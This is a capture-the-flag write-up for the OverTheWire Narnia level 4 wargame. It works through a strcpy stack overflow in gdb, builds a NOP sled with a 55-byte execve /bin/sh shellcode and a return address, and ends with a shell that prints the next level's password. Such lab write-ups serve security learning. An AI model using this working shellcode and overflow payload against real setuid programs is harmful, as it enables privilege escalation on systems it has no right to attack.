#### Narnia Level 3 → Level 4

```sh
➜  ~ ssh narnia4@narnia.labs.overthewire.org -p 2226
This is a OverTheWire game server. More information on http://www.overthewire.org/wargames
narnia4@narnia.labs.overthewire.org's password:

      ,----..            ,----,          .---.
     /   /   \         ,/   .`|         /. ./|
    /   .     :      ,`   .'  :     .--'.  ' ;
   .   /   ;.  \   ;    ;     /    /__./ \ : |
  .   ;   /  ` ; .'___,/    ,' .--'.  '   \' .
  ;   |  ; \ ; | |    :     | /___/ \ |    ' '
  |   :  | ; | ' ;    |.';  ; ;   \  \;      :
  .   |  ' ' ' : `----'  |  |  \   ;  `      |
  '   ;  \; /  |     '   :  ;   .   \    .\  ;
   \   \  ',  /      |   |  '    \   \   ' \ |
    ;   :    /       '   :  |     :   '  |--"
     \   \ .'        ;   |.'       \   \ ;
  www. `---` ver     '---' he       '---" ire.org


Welcome to OverTheWire!

If you find any problems, please report them to Steven or morla on
irc.overthewire.org.

--[ Playing the games ]--

  This machine might hold several wargames.
  If you are playing "somegame", then:

    * USERNAMES are somegame0, somegame1, ...
    * Most LEVELS are stored in /somegame/.
    * PASSWORDS for each level are stored in /etc/somegame_pass/.

  Write-access to homedirectories is disabled. It is advised to create a
  working directory with a hard-to-guess name in /tmp/.  You can use the
  command "mktemp -d" in order to generate a random and hard to guess
  directory in /tmp/.  Read-access to both /tmp/ and /proc/ is disabled
  so that users can not snoop on eachother. Files and directories with
  easily guessable or short names will be periodically deleted!

  Please play nice:

    * don't leave orphan processes running
    * don't leave exploit-files laying around
    * don't annoy other players
    * don't post passwords or spoilers
    * again, DONT POST SPOILERS!
      This includes writeups of your solution on your blog or website!

--[ Tips ]--

  This machine has a 64bit processor and many security-features enabled
  by default, although ASLR has been switched off.  The following
  compiler flags might be interesting:

    -m32                    compile for 32bit
    -fno-stack-protector    disable ProPolice
    -Wl,-z,norelro          disable relro

  In addition, the execstack tool can be used to flag the stack as
  executable on ELF binaries.

  Finally, network-access is limited for most levels by a local
  firewall.

--[ Tools ]--

 For your convenience we have installed a few usefull tools which you can find
 in the following locations:

    * peda (https://github.com/longld/peda.git) in /usr/local/peda/
    * gdbinit (https://github.com/gdbinit/Gdbinit) in /usr/local/gdbinit/
    * pwntools (https://github.com/Gallopsled/pwntools)
    * radare2 (http://www.radare.org/)
    * checksec.sh (http://www.trapkit.de/tools/checksec.html) in /usr/local/bin/checksec.sh

--[ More information ]--

  For more information regarding individual wargames, visit
  http://www.overthewire.org/wargames/

  For support, questions or comments, contact us through IRC on
  irc.overthewire.org #wargames.

  Enjoy your stay!

narnia4@narnia:~$
```

```sh
narnia4@narnia:~$ cd /narnia/
narnia4@narnia:/narnia$ ll
total 116
drwxr-xr-x  2 root    root    4096 Nov  9 15:08 ./
drwxr-xr-x 25 root    root    4096 Nov 21 07:46 ../
-r-sr-x---  1 narnia1 narnia0 7568 Nov  9 15:08 narnia0*
-r--r-----  1 narnia0 narnia0 1186 Nov  9 15:08 narnia0.c
-r-sr-x---  1 narnia2 narnia1 7404 Nov  9 15:08 narnia1*
-r--r-----  1 narnia1 narnia1 1000 Nov  9 15:08 narnia1.c
-r-sr-x---  1 narnia3 narnia2 5164 Nov  9 15:08 narnia2*
-r--r-----  1 narnia2 narnia2  999 Nov  9 15:08 narnia2.c
-r-sr-x---  1 narnia4 narnia3 5836 Nov  9 15:08 narnia3*
-r--r-----  1 narnia3 narnia3 1841 Nov  9 15:08 narnia3.c
-r-sr-x---  1 narnia5 narnia4 5336 Nov  9 15:08 narnia4*
-r--r-----  1 narnia4 narnia4 1064 Nov  9 15:08 narnia4.c
-r-sr-x---  1 narnia6 narnia5 5700 Nov  9 15:08 narnia5*
-r--r-----  1 narnia5 narnia5 1261 Nov  9 15:08 narnia5.c
-r-sr-x---  1 narnia7 narnia6 6076 Nov  9 15:08 narnia6*
-r--r-----  1 narnia6 narnia6 1602 Nov  9 15:08 narnia6.c
-r-sr-x---  1 narnia8 narnia7 6676 Nov  9 15:08 narnia7*
-r--r-----  1 narnia7 narnia7 1974 Nov  9 15:08 narnia7.c
-r-sr-x---  1 narnia9 narnia8 5232 Nov  9 15:08 narnia8*
-r--r-----  1 narnia8 narnia8 1292 Nov  9 15:08 narnia8.c
narnia4@narnia:/narnia$
```

```sh
narnia4@narnia:/narnia$ cat narnia4.c
```

```c
/*
    This program is free software; you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation; either version 2 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program; if not, write to the Free Software
    Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
*/

#include <string.h>
#include <stdlib.h>
#include <stdio.h>
#include <ctype.h>

extern char **environ;

int main(int argc,char **argv){
	int i;
	char buffer[256];

	for(i = 0; environ[i] != NULL; i++)
		memset(environ[i], '\0', strlen(environ[i]));

	if(argc>1)
		strcpy(buffer,argv[1]);

	return 0;
}
```

```sh
narnia4@narnia:/narnia$ ./narnia4
narnia4@narnia:/narnia$
```

```sh
narnia4@narnia:/narnia$ gdb ./narnia4 -q
Reading symbols from ./narnia4...(no debugging symbols found)...done.
(gdb) r $(python -c'print "A"*276')
Starting program: /narnia/narnia4 $(python -c'print "A"*276')

Program received signal SIGSEGV, Segmentation fault.
0x41414141 in ?? ()
(gdb) x/250x $esp
0xffffd520:	0x00000000	0xffffd5b4	0xffffd5c0	0x00000000
0xffffd530:	0x00000000	0x00000000	0xf7fc7000	0xf7ffdc04
0xffffd540:	0xf7ffd000	0x00000000	0xf7fc7000	0xf7fc7000
0xffffd550:	0x00000000	0x792b062b	0x436aa83b	0x00000000
0xffffd560:	0x00000000	0x00000000	0x00000002	0x080483b0
0xffffd570:	0x00000000	0xf7fee010	0xf7fe88a0	0xf7ffd000
0xffffd580:	0x00000002	0x080483b0	0x00000000	0x080483d1
0xffffd590:	0x080484ad	0x00000002	0xffffd5b4	0x08048550
0xffffd5a0:	0x080485b0	0xf7fe88a0	0xffffd5ac	0xf7ffd918
0xffffd5b0:	0x00000002	0xffffd6e3	0xffffd6f3	0x00000000
0xffffd5c0:	0xffffd808	0xffffd81c	0xffffd82c	0xffffd840
0xffffd5d0:	0xffffd862	0xffffd875	0xffffd87e	0xffffd88b
0xffffd5e0:	0xffffde13	0xffffde1e	0xffffde2a	0xffffdeb3
0xffffd5f0:	0xffffdeca	0xffffded9	0xffffdee5	0xffffdef6
0xffffd600:	0xffffdeff	0xffffdf12	0xffffdf1a	0xffffdf2c
0xffffd610:	0xffffdf3c	0xffffdf51	0xffffdf86	0xffffdfa6
0xffffd620:	0xffffdfc6	0x00000000	0x00000020	0xf7fd8be0
0xffffd630:	0x00000021	0xf7fd8000	0x00000010	0x178bfbff
0xffffd640:	0x00000006	0x00001000	0x00000011	0x00000064
0xffffd650:	0x00000003	0x08048034	0x00000004	0x00000020
0xffffd660:	0x00000005	0x00000008	0x00000007	0xf7fd9000
0xffffd670:	0x00000008	0x00000000	0x00000009	0x080483b0
0xffffd680:	0x0000000b	0x000036b4	0x0000000c	0x000036b4
0xffffd690:	0x0000000d	0x000036b4	0x0000000e	0x000036b4
0xffffd6a0:	0x00000017	0x00000000	0x00000019	0xffffd6cb
0xffffd6b0:	0x0000001f	0xffffdfe8	0x0000000f	0xffffd6db
0xffffd6c0:	0x00000000	0x00000000	0xc5000000	0xa30a1fb3
0xffffd6d0:	0xe6ea4340	0x57a54d7e	0x69d0db25	0x00363836
0xffffd6e0:	0x2f000000	0x6e72616e	0x6e2f6169	0x696e7261
0xffffd6f0:	0x41003461	0x41414141	0x41414141	0x41414141
0xffffd700:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd710:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd720:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd730:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd740:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd750:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd760:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd770:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd780:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd790:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd7a0:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd7b0:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd7c0:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd7d0:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd7e0:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd7f0:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd800:	0x41414141	0x00414141	0x00000000	0x00000000
0xffffd810:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffd820:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffd830:	0x00000000	0x00000000	0x00000000	0x00000000
---Type <return> to continue, or q <return> to quit---
```

```sh
>>> len("\x31\xc0\xeb\x22\x5b\x8b\x53\x08\x31\x13\x31\x53\x04\x31\xd2\x89\x5c\x24\x08\x89\x54\x24\x0c\xb0\x0b\x8d\x4c\x24\x08\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xd9\xff\xff\xff\x6e\x23\x28\x2f\x6e\x32\x29\x41\x41\x41\x41\x41")
55
>>>
```

[``Linux/x86 - execve /bin/sh XOR Encoded Shellcode (55 bytes)``](https://www.exploit-db.com/exploits/13456/)

- Exploit

	- (276 - (55 +4)) ``NOP`` + 55 ``Shellcode`` + 4 ``Return Address`` &rarr; 276
	- 217 ``NOP`` + 55 ``Shellcode`` + 4 ``Return Address`` &rarr; 276

```sh
run $(python -c'print "\x90"*217 + "\x31\xc0\xeb\x22\x5b\x8b\x53\x08\x31\x13\x31\x53\x04\x31\xd2\x89\x5c\x24\x08\x89\x54\x24\x0c\xb0\x0b\x8d\x4c\x24\x08\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xd9\xff\xff\xff\x6e\x23\x28\x2f\x6e\x32\x29\x41\x41\x41\x41\x41" + "\x42\x42\x42\x42"')
```

```sh
narnia4@narnia:/narnia$ gdb ./narnia4 -q
Reading symbols from ./narnia4...(no debugging symbols found)...done.
(gdb) run $(python -c'print "\x90"*217 + "\x31\xc0\xeb\x22\x5b\x8b\x53\x08\x31\x13\x31\x53\x04\x31\xd2\x89\x5c\x24\x08\x89\x54\x24\x0c\xb0\x0b\x8d\x4c\x24\x08\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xd9\xff\xff\xff\x6e\x23\x28\x2f\x6e\x32\x29\x41\x41\x41\x41\x41" + "\x42\x42\x42\x42"')
Starting program: /narnia/narnia4 $(python -c'print "\x90"*217 + "\x31\xc0\xeb\x22\x5b\x8b\x53\x08\x31\x13\x31\x53\x04\x31\xd2\x89\x5c\x24\x08\x89\x54\x24\x0c\xb0\x0b\x8d\x4c\x24\x08\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xd9\xff\xff\xff\x6e\x23\x28\x2f\x6e\x32\x29\x41\x41\x41\x41\x41" + "\x42\x42\x42\x42"')

Program received signal SIGSEGV, Segmentation fault.
0x42424242 in ?? ()
(gdb) x/250x $esp
0xffffd520:	0x00000000	0xffffd5b4	0xffffd5c0	0x00000000
0xffffd530:	0x00000000	0x00000000	0xf7fc7000	0xf7ffdc04
0xffffd540:	0xf7ffd000	0x00000000	0xf7fc7000	0xf7fc7000
0xffffd550:	0x00000000	0xe3415120	0xd900ff30	0x00000000
0xffffd560:	0x00000000	0x00000000	0x00000002	0x080483b0
0xffffd570:	0x00000000	0xf7fee010	0xf7fe88a0	0xf7ffd000
0xffffd580:	0x00000002	0x080483b0	0x00000000	0x080483d1
0xffffd590:	0x080484ad	0x00000002	0xffffd5b4	0x08048550
0xffffd5a0:	0x080485b0	0xf7fe88a0	0xffffd5ac	0xf7ffd918
0xffffd5b0:	0x00000002	0xffffd6e3	0xffffd6f3	0x00000000
0xffffd5c0:	0xffffd808	0xffffd81c	0xffffd82c	0xffffd840
0xffffd5d0:	0xffffd862	0xffffd875	0xffffd87e	0xffffd88b
0xffffd5e0:	0xffffde13	0xffffde1e	0xffffde2a	0xffffdeb3
0xffffd5f0:	0xffffdeca	0xffffded9	0xffffdee5	0xffffdef6
0xffffd600:	0xffffdeff	0xffffdf12	0xffffdf1a	0xffffdf2c
0xffffd610:	0xffffdf3c	0xffffdf51	0xffffdf86	0xffffdfa6
0xffffd620:	0xffffdfc6	0x00000000	0x00000020	0xf7fd8be0
0xffffd630:	0x00000021	0xf7fd8000	0x00000010	0x178bfbff
0xffffd640:	0x00000006	0x00001000	0x00000011	0x00000064
0xffffd650:	0x00000003	0x08048034	0x00000004	0x00000020
0xffffd660:	0x00000005	0x00000008	0x00000007	0xf7fd9000
0xffffd670:	0x00000008	0x00000000	0x00000009	0x080483b0
0xffffd680:	0x0000000b	0x000036b4	0x0000000c	0x000036b4
0xffffd690:	0x0000000d	0x000036b4	0x0000000e	0x000036b4
0xffffd6a0:	0x00000017	0x00000000	0x00000019	0xffffd6cb
0xffffd6b0:	0x0000001f	0xffffdfe8	0x0000000f	0xffffd6db
0xffffd6c0:	0x00000000	0x00000000	0x04000000	0x88198095
0xffffd6d0:	0xbd6f8e75	0x5cfb1af3	0x69e7bbe6	0x00363836
0xffffd6e0:	0x2f000000	0x6e72616e	0x6e2f6169	0x696e7261
0xffffd6f0:	0x90003461	0x90909090	0x90909090	0x90909090
0xffffd700:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffd710:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffd720:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffd730:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffd740:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffd750:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffd760:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffd770:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffd780:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffd790:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffd7a0:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffd7b0:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffd7c0:	0x90909090	0x90909090	0x90909090	0x22ebc031
0xffffd7d0:	0x08538b5b	0x53311331	0x89d23104	0x8908245c
0xffffd7e0:	0xb00c2454	0x244c8d0b	0x3180cd08	0x40d889db
0xffffd7f0:	0xd9e880cd	0x6effffff	0x6e2f2823	0x41412932
0xffffd800:	0x42414141	0x00424242	0x00000000	0x00000000
0xffffd810:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffd820:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffd830:	0x00000000	0x00000000	0x00000000	0x00000000
---Type <return> to continue, or q <return> to quit---
```

Possible return addresses → ``0xffffd700``, ``0xffffd710``, ``0xffffd720``, ``0xffffd730``, ``0xffffd740``, ``0xffffd750``, ``0xffffd760``, ``0xffffd770``, ``0xffffd780``, ``0xffffd790``, ``0xffffd7a0``, ``0xffffd7b0``

```sh
0xffffd700:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffd710:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffd720:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffd730:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffd740:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffd750:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffd760:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffd770:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffd780:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffd790:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffd7a0:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffd7b0:	0x90909090	0x90909090	0x90909090	0x90909090
```

```sh
narnia4@narnia:/narnia$ ./narnia4 $(python -c'print "\x90"*(217) + "\x31\xc0\xeb\x22\x5b\x8b\x53\x08\x31\x13\x31\x53\x04\x31\xd2\x89\x5c\x24\x08\x89\x54\x24\x0c\xb0\x0b\x8d\x4c\x24\x08\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xd9\xff\xff\xff\x6e\x23\x28\x2f\x6e\x32\x29\x41\x41\x41\x41\x41" + "\xa0\xd7\xff\xff"')
$ cat /etc/narnia_pass/narnia5
faimahchiy
```